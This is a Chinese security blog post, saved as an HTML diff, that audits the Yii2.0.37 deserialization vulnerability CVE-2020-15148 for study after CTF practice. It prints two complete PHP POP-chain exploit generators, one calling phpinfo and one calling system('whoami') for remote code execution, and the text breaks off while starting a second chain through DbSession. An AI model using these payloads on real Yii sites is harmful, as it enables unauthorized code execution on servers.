@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lzer0kx.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前段时间做了CTFshow-web的反序列化部分，其中部分题目涉及到Yii，Laravel等php框架的反序列化漏洞，当时只是用现成的poc链子打，没有详细分析，今天就专门先分析一下Yii2.0.37框架的CVE-2020-15148 反序列化漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yii2.0.37代码审计(CVE-2020-15148反序列化)">
+<meta property="og:url" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Lzer0Kx的信安之路">
+<meta property="og:description" content="前段时间做了CTFshow-web的反序列化部分，其中部分题目涉及到Yii，Laravel等php框架的反序列化漏洞，当时只是用现成的poc链子打，没有详细分析，今天就专门先分析一下Yii2.0.37框架的CVE-2020-15148 反序列化漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203620211.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203628272.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203637112.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203644013.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203651076.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203659953.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203707381.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203714554.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203720390.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203726890.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203734397.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203739989.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203745339.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203753171.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203804444.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203813212.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203822910.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203830833.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203836156.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203842366.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203852908.png">
+<meta property="article:published_time" content="2022-12-21T12:48:07.000Z">
+<meta property="article:modified_time" content="2022-12-21T12:42:59.902Z">
+<meta property="article:author" content="Lzer0Kx">
+<meta property="article:tag" content="PHP代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203620211.png">
+
+<link rel="canonical" href="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Yii2.0.37代码审计(CVE-2020-15148反序列化) | Lzer0Kx的信安之路</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Lzer0Kx的信安之路</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lzer0kx.top/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Lzer0Kx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lzer0Kx的信安之路">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Yii2.0.37代码审计(CVE-2020-15148反序列化)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-21 20:48:07 / 修改时间：20:42:59" itemprop="dateCreated datePublished" datetime="2022-12-21T20:48:07+08:00">2022-12-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>前段时间做了CTFshow-web的反序列化部分，其中部分题目涉及到Yii，Laravel等php框架的反序列化漏洞，当时只是用现成的poc链子打，没有详细分析，今天就专门先分析一下Yii2.0.37框架的CVE-2020-15148 反序列化漏洞</p>
+<span id="more"></span>
+
+<p>php依赖管理器composer</p>
+<p>安装完成</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203620211.png" alt="image-20221221203620211"></p>
+<p>创建一个名为yii的新建文件夹用来存放我们的项目 用下面指令进行项目构建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist yiisoft/yii-app-basic basic</span><br></pre></td></tr></table></figure>
+
+<p>然后可以看到</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203628272.png" alt="image-20221221203628272"></p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S localhost:8888</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 成功访问</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203637112.png" alt="image-20221221203637112">需要添加一个反序列化漏洞的入口</p>
+<p>&#x2F;controllers&#x2F;TestController.php</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203644013.png" alt="image-20221221203644013"></p>
+<p>访问</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203651076.png" alt="image-20221221203651076"></p>
+<p>一般在分析反序列化漏洞时 都需要先找到漏洞起点</p>
+<p>CVE-2020-15148漏洞的影响文件是yii2&#x2F;db&#x2F;BatchQueryResult.php</p>
+<p>最常见的反序列化起点无非就是__destruct()或__wakeup() 其它的魔术方法作为构成pop链的一环。下面正式开始分析漏洞</p>
+<p>访问&#x2F;vendor&#x2F;yiisoft&#x2F;yii2&#x2F;db&#x2F;BatchQueryResult.php</p>
+<p>关键代码</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203659953.png" alt="image-20221221203659953"></p>
+<p>在经过反序列化时 通过__destruct魔术方法 触发自身的reset方法</p>
+<p>此时 _dataReader变量是可控制的</p>
+<p>resat方法中通过_dataReader属性又调用了close方法&amp;#x20;</p>
+<p>此时需要分情况讨论</p>
+<p>如果_dataReader对象没有close方法 触发__call()魔术方法 从__call()方法触发其它危险函数</p>
+<p>如果_dataReader对象存在close方法 触发close方法 从close方法触发其它危险函数</p>
+<p>第一种情况</p>
+<p>寻找包含有__call()魔术方法的类</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203707381.png" alt="image-20221221203707381"></p>
+<p>每个类进行筛选</p>
+<p>&#x2F;vendor&#x2F;fzaninotto&#x2F;faker&#x2F;src&#x2F;Faker&#x2F;ValidGenerator.php</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203714554.png" alt="image-20221221203714554"></p>
+<p>先学习一下这个函数</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203720390.png" alt="image-20221221203720390"></p>
+<p>call_user_func_array和call_user_func函数中的$callback参数支持已经实例化的对象作为数组传递</p>
+<p>一个已经实例化的object方法被作为array传递 下标0包含该object 下标1包含方法名</p>
+<p>demo</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203726890.png" alt="image-20221221203726890"></p>
+<p>这样就可以执行demo类中的demo_func函数</p>
+<p>但在ValidGenerator.php中 class不可控 方法不可控</p>
+<p>最终筛选到&#x2F;vendor&#x2F;fzaninotto&#x2F;faker&#x2F;src&#x2F;Faker&#x2F;Generator.php</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203734397.png" alt="image-20221221203734397"></p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203739989.png" alt="image-20221221203739989"></p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203745339.png" alt="image-20221221203745339"></p>
+<p>整理一下这个过程就是</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203753171.png" alt="image-20221221203753171"></p>
+<p>这个过程分析一下就是</p>
+<p>__call()魔术方法会调用自身的format方法 format方法又会调用call_user_func_array</p>
+<p>然后又会触发getFormatter方法进行一个简单判断</p>
+<p>往回看 我们是通过BatchQueryResult.php中$this→_dataReader→close();来触发__call() 这个时候$formatter的值是close&amp;#x20;</p>
+<p>判断逻辑是如果存在$this→formatters[‘close’] 那么就返回它的值</p>
+<p>总的来说 就是可以控制$this→formatters[‘close’] 来调用不同的函数</p>
+<p>到此为止 就可以简单构造一个pop链子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">phpinfo()   //无参函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Faker &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = &#x27;phpinfo&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">            $this-&gt;_dataReader=new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use yii\db\BatchQueryResult;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new BatchQueryResult()));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行phpinfo</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203804444.png" alt="image-20221221203804444"></p>
+<p>但是目前还是只能执行无参数的函数 不能rce</p>
+<p>回过头来看call_user_func_array函数中的$callback参数的特性 可以执行其它类中的函数 这个时候就要寻找yii2框架代码中 是否存在可以代码执行的点 但是还有要求是两个参数都要来自类本身 还要可控</p>
+<p>先找一下call_user_func($this→</p>
+<p>最终找到</p>
+<p>&#x2F;basic&#x2F;vendor&#x2F;yiisoft&#x2F;yii2&#x2F;rest&#x2F;IndexAction.php</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203813212.png" alt="image-20221221203813212"></p>
+<p>调用的函数都是无参数调用的</p>
+<p>pop链子调整为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run-&gt;call_user_func()-&gt;system(&#x27;id&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class IndexAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;system&#x27;;</span><br><span class="line">            $this-&gt;id = &#x27;whoami&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker &#123;</span><br><span class="line"></span><br><span class="line">    use yii\rest\IndexAction;</span><br><span class="line"></span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new IndexAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader=new Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use yii\db\BatchQueryResult;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize(new BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功rce</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203822910.png" alt="image-20221221203822910"></p>
+<p>第二种情况 寻找存在close()函数的类 通过close去调用其它危险函数</p>
+<p>关键字 function close()</p>
+<p>找到 &#x2F;basic&#x2F;vendor&#x2F;yiisoft&#x2F;yii2&#x2F;web&#x2F;DbSession.php</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203830833.png" alt="image-20221221203830833"></p>
+<p>MultiFieldSession类</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203836156.png" alt="image-20221221203836156"></p>
+<p>Session类</p>
+<p><img src="/2022/12/21/yii2.0.37%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221221203842366.png" alt="image-20221221203842366"></p>
+<p>各个类之间存在继承关系 整理一下就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace yii\web;</span><br><span class="line"></span><br><span class="line">class DbSession extends MultiFieldSession</span><br><span class="line">&#123;</span><br><span class="line">    public function close()</span><br><span class="line">&#123;</span><br><span class="line">        if ($this-&gt;getIsActive()) &#123;</span><br><span class="line">            $this-&gt;fields = $this-&gt;composeFields();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace yii\web;</span><br><span class="line"></span><br><span class="line">abstract class MultiFieldSession extends Session</span><br><span class="line">&#123;</span><br><span class="line">    public $writeCallback;</span><br><span class="line"></span><br><span class="line">    protected function composeFields($id = null, $data = null)</span><br><span class="line">&#123;</span><br><span class="line">        $fields = $this-&gt;writeCallback ? call_user_func($this-&gt;writeCallback, $this) : [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace yii\web;</span><br><span class="line"></span><br><span class="line">class Session extends Component implements \IteratorAggregate, \ArrayAccess, \Countable</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public function getIsActive()</span><br><span class="line">&#123;</span><br><span class="line">        return session_status() === PHP_SESSION_ACTIVE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>close()函数触发后会进行getIsACtive()的判断 如果条件成立调用composeFields() 然后触发call_user_func函数 并且第一个参数$writeCallback可控 之后就可以利用IndexAction</p>
+<p>getIsActive()的返回值与session有关 当开启session时 返回值为True 所以只要正常网页访问则永远为True</p>
+<p>pop链子</p>
